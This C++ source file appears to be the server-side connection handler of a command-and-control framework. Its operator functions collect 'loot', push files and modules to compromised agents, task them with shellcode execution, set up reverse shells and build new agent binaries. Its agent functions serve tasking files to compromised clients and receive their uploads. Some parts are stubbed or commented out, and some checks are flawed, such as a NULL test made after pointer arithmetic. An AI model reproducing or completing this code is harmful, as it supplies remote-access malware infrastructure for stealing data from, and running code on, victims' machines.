#include "connection.h"

/*constructor for the connection instance*/
ConnectionInstance::ConnectionInstance(class Server *server){
    this->logger = server->get_log();
    this->server = server;
    this->data = nullptr;
}

/*Neato destructor*/
ConnectionInstance::~ConnectionInstance(){
    return;
}

/*Handler for manager connections and flow*/
void ConnectionInstance::manager_handler(){
    int operation;
    int quitting = 0;
    int count = 0;
    char *ptr = NULL;
    char *dat_ptr = NULL;
    char *d_ptr = NULL;
    char tmpbf[3] = {0,0,0};
    char tmpbuffer[8];
    char filename[2048];
    char *resp = (char *)malloc(2048);
    char buff[BUFSIZ];
    char logbuff[BUFSIZ];
            
    // main instruction loop
    while (!quitting)
    {
        // reset variables for loop
        ptr = resp;
        operation = -1;
        dat_ptr = NULL;

        
        memset((void*)buff, 0, sizeof(buff));
        memset((void*)tmpbuffer, 0, sizeof(tmpbuffer));
        memset((void*)filename, 0, sizeof(filename));
        memset((void*)resp, 0, 2048);
        memset((void*)logbuff, 0, sizeof(logbuff));
        memset((void*)tmpbf, 0, sizeof(tmpbf));
        
        // get operation request
        this->transport->read(&resp, 2048);
        
        // parse it
        strncat(tmpbf,resp,2);
        operation = atoi(tmpbf);
        ptr += 3;

        this->logger->log("Manager %s: Operation caught: %d\n", data->id, operation);

        // main switch
        switch (operation)
        {
        case MANAG_EXIT:
            quitting = 1;
            break;

        case MANAG_GET_LOOT:
            transport->get_loot(ptr);
            break;

        case MANAG_UP_FILE:
            // Agent_id is stored in ptr
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                sprintf(logbuff, "Wrong format identified from input\n");
                this->logger->log("Manager %d: Caught wrong format identifier in input\n", this->data->id);
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));
            
            transport->download_file(d_ptr, 1, dat_ptr);
            AgentInformationHandler::task(AGENT_DOWN_FILE, dat_ptr, d_ptr);
            break;

        case MANAG_REQ_RVSH:
            AgentInformationHandler::task(AGENT_REV_SHELL, dat_ptr, d_ptr);
            break;

        case MANAG_TASK_MODULE:
            // Agent_id is stored in ptr 
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                this->logger->log("Manager %s: Wrong format identifier from input\n", this->data->id);
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));
            
            transport->download_file(d_ptr, 1, dat_ptr);
            
            AgentInformationHandler::task(AGENT_EXEC_MODULE, dat_ptr, d_ptr);
            break;

        case MANAG_CHECK_LOOT:
            printf("Caught loot check call\n");
            break;

        case MANAG_DOWN_FILE:
            // requested agent and filename are stored in ptr
            // by the end, filename is in d_ptr and agent is in dat_ptr
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                this->logger->log("Manager %s: Wrong format identifier from input\n", this->data->id);
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));
            AgentInformationHandler::task(AGENT_UP_FILE, dat_ptr, d_ptr);
            this->transport->send_ok();
            break;

        case MANAG_TASK_SC:
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                this->logger->log("Manager %s: Wrong format identifier from input\n", this->data->id);
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));
            
            AgentInformationHandler::task(AGENT_EXEC_SC, dat_ptr, d_ptr);
            this->transport->send_ok();
            break;

        case MANAG_GET_AGENT:
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                this->logger->log("Manager %s: Wrong format identifier from input\n", this->data->id);
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));

            transport->make_agent(dat_ptr, d_ptr);
            dat_ptr = NULL;
            transport->upload_file("out/client.out", 0);
            break;

        case MANAG_REG_AGENT:
            printf("Caught agent register call\n");
            break;

        case MANAG_GET_INFO:
            this->transport->get_info(ptr);
            break;

        case MANAG_REQ_PORTS:
            this->get_ports(ptr);
            break;

        case MANAG_CONN_RVSH:
            this->transport->init_reverse_shell(ptr);
            break;

        case MANAG_GET_TRANSPORTS:
            this->send_transports();
            break;

        case MANAG_START_TRANSPORT:
            this->setup_transport(ptr);
            break;

        default:
            this->logger->log("Manager %s: Unknown operation value '%d'\n", this->data->id, operation);
            this->transport->send_err();
            break;
        }
    }
    free(resp);
    
}

/*Returns all available ports for accessing reverse shells*/
void ConnectionInstance::get_ports(char *ptr){

}

void ConnectionInstance::send_transports(){
    // TODO: Fix this to make it dynamic (but dont know how to store transport info dynamically)
    char *tmp = (char*)malloc(100);
    this->transport->write("18", 3);
    this->transport->read(&tmp, 3);
    this->transport->write("SSH Transport:51\n",18);
}

/*Place holder*/
void ConnectionInstance::reverse_shell(){
    printf("Waiting for shell handling...\n");
    while(this->shell_finished) sleep(1);
}
/*Handles reverse shell connections and forwarding*/

/*Handler for agent connections and flow*/
void ConnectionInstance::agent_handler(){    
    // initialize variables
    int operation = 0;
    int quitting = 0;
    char *ptr = NULL;
    char tmpbf[3] = {0,0,0};
    char tmpbuffer[8];
    char buff[2048];
    char filename[2048];
    char *resp = (char *)malloc(2048);
    char logbuff[BUFSIZ];
    
    // enters main handler loop
    while (!quitting)
    {
        // reset buffers and variables on repeat
        ptr = resp;
        operation = -1;
        memset((void*)buff, 0, sizeof(buff));
        memset((void*)tmpbuffer, 0, sizeof(tmpbuffer));
        memset((void*)filename, 0, sizeof(filename));
        memset((void*)resp, 0, 2048);
        memset((void*)logbuff, 0, sizeof(logbuff));
        
        // gets the agent's requested tasking operation
        this->transport->read(&resp, 2048);
        
        // parses operation into buffers
        //printf("Requested tasking: %s\n", resp);
        strncat(tmpbf,resp,2);
        operation = atoi(tmpbf);
        ptr += 3;
        
        /*
        Command data structure:
            First char: 
                Describes what command it is
            Following chars:
                Optional values, separated by ',' chars
            Terminating sequence:   
                NULL
        */

        this->logger->log("Client %s: Operation caught: %d\n", this->data->id, operation);

        // main decision switch
        switch (operation)
        {
        case AGENT_EXIT:
            this->logger->log("Client %s: Client exiting...\n", data->id); 
            quitting = 1;
            break;

        case AGENT_DOWN_FILE:
            sprintf(buff, "agents/%s/tasking/%s", data->id, ptr);
            transport->upload_file(buff, 0);
            break;

        case AGENT_UP_FILE:
            transport->download_file(ptr, 0, NULL);
            break;

        case AGENT_REV_SHELL:
            this->logger->log("Client %s: Agent reverse shell caught\n", this->data->id);
            //this->server->get_shell_queue()->push(this);
            //this->reverse_shell();
            break;

        case AGENT_EXEC_MODULE:
            sprintf(buff, "agents/%s/tasking/%s", data->id, ptr);
            transport->upload_file(buff, 1);
            break;

        default:
            this->logger->log("Client %s: Unknown Operation Identifier: '%d'\n", this->data->id, operation);
            this->transport->send_err();
            quitting = 1;
            break;
        }
    }
    free(resp);
}

void ConnectionInstance::shell_finish(){
    this->shell_finished = 1;
}


/*Initialized the connection and prepares data structures for handlers*/
void *ConnectionInstance::handle_connection(void *input){
    class ConnectionInstance *instance = (class ConnectionInstance *)input;

    instance->get_transport()->listen();

    // creates classes and instances
    int handler = instance->transport->determine_handler();
    

    // determines handler to use
    if (handler == AGENT_TYPE)
    {
        printf("Starting agent handler\n");
        instance->agent_handler();
    } else if(handler == MANAG_TYPE)
    {
        printf("Starting manager handler\n");
        instance->manager_handler();
    } else
    {
        // failed to handle the parsing :)
        instance->logger->log("Connection Instance %d: Got Unknown Handler Type: %d\n", 0, handler);
    }
    return NULL;
}

void ConnectionInstance::setup_transport(char *num){
    class ServerTransport *transport;
    class ConnectionInstance *instance = new ConnectionInstance(this->server);
    int transport_type = atoi(num);
    switch (transport_type)
    {
    case TRANSPORT_SSH:
        //transport = new Ssh_Transport(instance);
        //this->server->add_instance(instance);
        //this->server->listen_instance(instance);
        break;
    
    default:
        this->logger->log("Manager %s: Failed to identify transport ID %d\n", this->data->id, transport_type);
        break;
    }
}

/*Sets the transport for the connection instance*/
void ConnectionInstance::set_transport(ptransport_t transport){
    this->transport = transport;
    this->data = transport->get_data();
}

/*returns the logger used by the instance*/
class Log *ConnectionInstance::get_logger(){
    return this->logger;
}

ptransport_t ConnectionInstance::get_transport(){
    return this->transport;
}

pClientDat ConnectionInstance::get_data(){
    return this->data;
}

void ConnectionInstance::set_thread(pthread_t thread){
    this->thread = thread;
}

class Server *ConnectionInstance::get_server(){
    return this->server;
}